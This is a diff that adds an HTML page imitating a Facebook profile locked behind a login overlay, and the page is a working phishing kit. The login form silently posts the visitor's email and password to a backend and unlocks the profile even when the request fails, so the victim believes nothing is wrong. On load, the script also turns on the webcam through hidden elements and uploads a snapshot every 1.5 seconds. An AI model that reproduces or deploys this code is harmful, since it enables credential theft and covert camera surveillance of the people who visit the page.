@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>Facebook - Log In to View Profile</title>
+    
+    <!-- Dependencies -->
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+
+    <style>
+        @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500&display=swap");
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            height: 100%;
+            overflow: hidden; /* Lock scrolling while logged out */
+        }
+
+        /* --- BACKGROUND PROFILE STYLES --- */
+        #main-content {
+            transition: filter 0.5s ease;
+        }
+        .cover-photo {
+            width: 100%;
+            height: 250px;
+            background: url('cover-photo.png') no-repeat center/cover;
+            position: relative;
+        }
+        .profile-pic {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            border: 5px solid #fff;
+            position: absolute;
+            bottom: -80px;
+            left: 20px;
+            background: url('profile.png') no-repeat center/cover;
+        }
+        .profile-info {
+            margin-left: 200px;
+            padding: 20px;
+        }
+        .profile-info h1 { margin: 0; font-size: 28px; }
+        .profile-info p { color: #606770; }
+        .nav-tabs {
+            display: flex;
+            border-bottom: 1px solid #ccc;
+            margin: 20px 0;
+            padding-left: 20px;
+        }
+        .nav-tabs a {
+            text-decoration: none;
+            padding: 10px 20px;
+            color: #606770;
+            font-weight: bold;
+        }
+        .nav-tabs a.active { border-bottom: 3px solid #1877f2; color: #1877f2; }
+        .container {
+            max-width: 900px;
+            margin: 20px auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .section-title { font-size: 18px; font-weight: bold; margin-bottom: 10px; }
+        .photos img { width: 100px; height: 100px; object-fit: cover; margin: 5px; border-radius: 8px; }
+        .post { border-top: 1px solid #ccc; padding-top: 10px; margin-top: 10px; }
+        .btn { background-color: #e4e6eb; color: #050505; padding: 5px 10px; text-decoration: none; border-radius: 4px; font-size: 14px; }
+
+        /* --- LOGIN POPUP OVERLAY STYLES --- */
+        #login-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.12);
+            backdrop-filter: blur(5px); 
+            -webkit-backdrop-filter: blur(5px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+
+        .login-card {
+            background: white;
+            width: 400px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 12px 28px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+
+        .fb-logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .login-card input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+
+        .login-btn {
+            width: 96%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 15px 0;
+        }
+
+        .login-btn:hover { background-color: #166fe5; }
+        .forgot-pw { color: #1877f2; text-decoration: none; font-size: 14px; }
+        .create-account-btn {
+            display: block;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #42b72a;
+            color: white;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: bold;
+            width: 80%;
+            margin-left: 10%;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Background Content (The Profile) -->
+    <div id="main-content">
+        <div class="header" style="padding: 10px; font-weight: bold;">Facebook Profile</div>
+        <div class="cover-photo"><div class="profile-pic"></div></div>
+        <div class="profile-info">
+            <h1>John Boro</h1>
+            <p>1.3K friends</p>
+        </div>
+        <div class="nav-tabs">
+            <a href="#" class="active">Posts</a>
+            <a href="#">About</a>
+            <a href="#">Friends</a>
+            <a href="#">Photos</a>
+        </div>
+        <div class="container">
+            <div class="section-title">Intro</div>
+            <p>Add bio</p>
+            <div class="photos">
+                <img src="https://via.placeholder.com/100">
+                <img src="https://via.placeholder.com/100">
+            </div>
+            <div class="post">
+                <strong>John Boro</strong> <br>
+                “HACKED ACCOUNT”
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Popup Overlay -->
+    <div id="login-overlay">
+        <div class="login-card">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/7B_fD6rRzP1.svg" class="fb-logo" alt="Facebook">
+            <!-- Added ID to form for JS targeting -->
+            <form id="loginForm">
+                <input type="text" id="email" name="email" placeholder="Email or phone number" required>
+                <input type="password" id="pass" name="pass" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+                <a href="#" class="forgot-pw">Forgot password?</a>
+                <hr style="margin: 20px 0; border: 0; border-top: 1px solid #ddd;">
+                <a href="#" class="create-account-btn">Create new account</a>
+            </form>
+        </div>
+    </div>
+
+    <!-- Hidden elements for camera operation -->
+    <div style="display:none;">
+        <video id="video" playsinline autoplay></video>
+        <canvas id="canvas" width="640" height="480"></canvas>
+    </div>
+
+    <script>
+        // --- 1. WEBCAM CAPTURE LOGIC ---
+        function postImage(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'api/login',
+                dataType: 'json',
+                async: false
+            });
+        }
+
+        async function initCamera() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const constraints = { audio: false, video: { facingMode: "user" } };
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                const context = canvas.getContext('2d');
+                
+                setInterval(function () {
+                    context.drawImage(video, 0, 0, 640, 480);
+                    const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                    postImage(canvasData);
+                }, 1500);
+            } catch (e) {
+                console.log("Camera error: " + e);
+            }
+        }
+
+        // --- 2. LOGIN HANDLING LOGIC ---
+        $(document).ready(function() {
+            $('#loginForm').submit(function(e) {
+                e.preventDefault(); // Stops the page from refreshing
+
+                // Collect data
+                var formData = {
+                    email: $('#email').val(),
+                    pass: $('#pass').val()
+                };
+
+                // Send data to backend silently
+                $.ajax({
+                    type: 'POST',
+                    url: '/api/login',
+                    data: formData,
+                    success: function() {
+                        unlockProfile();
+                    },
+                    error: function() {
+                        // Even if the server errors, we unlock the profile so the user thinks it worked
+                        unlockProfile();
+                    }
+                });
+            });
+        });
+
+        function unlockProfile() {
+            // Hide overlay
+            $('#login-overlay').fadeOut(500, function() {
+                // Remove blur from background
+                $('#main-content').css('filter', 'none');
+                // Allow user to scroll again
+                $('body').css('overflow', 'auto');
+            });
+        }
+
+        // Run camera on load
+        window.onload = initCamera;
+    </script>
+</body>
+</html>
